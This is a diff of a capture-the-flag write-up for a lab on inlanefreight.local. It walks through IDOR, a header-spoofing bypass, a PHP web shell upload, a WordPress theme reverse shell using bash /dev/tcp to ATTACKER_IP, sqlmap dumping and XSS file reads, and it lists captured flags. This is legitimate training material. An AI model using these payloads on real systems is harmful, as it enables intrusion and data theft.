@@ -65,11 +65,13 @@ profile      [Status: 200, Size: 10148, Words: 3146, Lines: 195, Duration: 159ms
 register     [Status: 200, Size: 9754, Words: 2772, Lines: 191, Duration: 182ms]
 ```
 
+### Third Flag
 Then I browsed all the parameters and eventually got to http://careers.inlanefreight.local:80/register?id=1 to register an account with arbitrary credentials which authenticated me to the web server. I then was able view other profiles on http://careers.inlanefreight.local:80/profile?id=4 by adjusting the id parameter
 which got me the third flag: HTB{8f40ecf17f681612246fa5728c159e46}
 
 Next, I moved on to dev.inlanefreight.local. I used ffuf to enumerate any php files which got me to dev.inlanefreight.local/login.php. I noticed that I did not have access via the HTTP GET request, so I tried different HTTP requests until I noticed that the TRACK request worked (TRACE request did not work either), and then noticed from the original get request that there was an HTTP line called X-Custom-IP-Authorization, which declared a 172 ip address. I set it to loopback address to try to delcare myself as an authorized ip address, which successfully got me onto the login.php website. 
 
+### Fourth Flag
 Then, I see a file upload button and tried uploading a PHP web shell. It did not work since the uploader only allowed img/png files. I uploaded a test png file and recorded the HTTP POST request on BurpSuite. I changed the JPG code to the php web shell code, and then sent it again on BurpSuite to the site. This is successful and gave me a response saying that file was uploaded to /uploads/screenshot.png:
 ![[Pasted image 20250314195405.png]]
 
@@ -86,7 +88,9 @@ I get a flag.txt file at the directory /var/www/html/flag.txt.
 
 Using another url encoded command cat%20%2Fvar%2Fwww%2Fhtml%2Fflag.txt,
 
-we get ==HTB{57c7f6d939eeda90aa1488b15617b9fa} as the 4th flag.==
+we get HTB{57c7f6d939eeda90aa1488b15617b9fa} as the 4th flag.
+
+### Fifth Flag:
 
 Since we now have remote code execution through the web shell, we will attempt to upgrade the web shell to a fully interactive shell. 
 
@@ -106,8 +110,9 @@ Logging into WordPress, we try the theme editor attack where we inject a php rev
 exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
 ?>
 
-and then inserting it into one of the themes php files. We then start our netcat listener and activate the theme to receive the bash shell. After using a find command, we find the 5th flag in the /var/www/html directory: ==HTB{e7134abea7438e937b87608eab0d979c}==
+and then inserting it into one of the themes php files. We then start our netcat listener and activate the theme to receive the bash shell. After using a find command, we find the 5th flag in the /var/www/html directory: HTB{e7134abea7438e937b87608eab0d979c}
 
+### Sixth Flag:
 
 Next we move onto status.inlanefreight.local. I see that there is a text box on the website so I attempted a sql injection with ' OR 1=1 --. It did not seem to work but it did throw a SQL error message on BurpSuite repeater. I saved the HTTP request as a file and then input it into sqlmap with the command "sqlmap -r sqlmap1 --batch --dump --level 5 --risk 3" with sqlmap1 as the HTTP request file. 
 
@@ -122,6 +127,7 @@ The command gives us this table:
 
 and we get the ==6th flag: 1fbea4df249ac4f4881a5da387eb297cf==
 
+### Seventh Flag:
 For tracking.inlanefreight.local, we try to list out potential filesystems with a javascript command using XMLHttpRequest():
 ```
 <script>
@@ -148,6 +154,8 @@ When we paste this command into the text prompt, we get the output "/etc/ not ac
 ```
 
 This works, and gets us our ==7th flag from tracking.inlanefreight.local: HTB{49f0bad299687c62334182178bfd75d8}==
+
+### 8th Flag:
 
 Next target will be gitlab.inlanefreight.local.
 
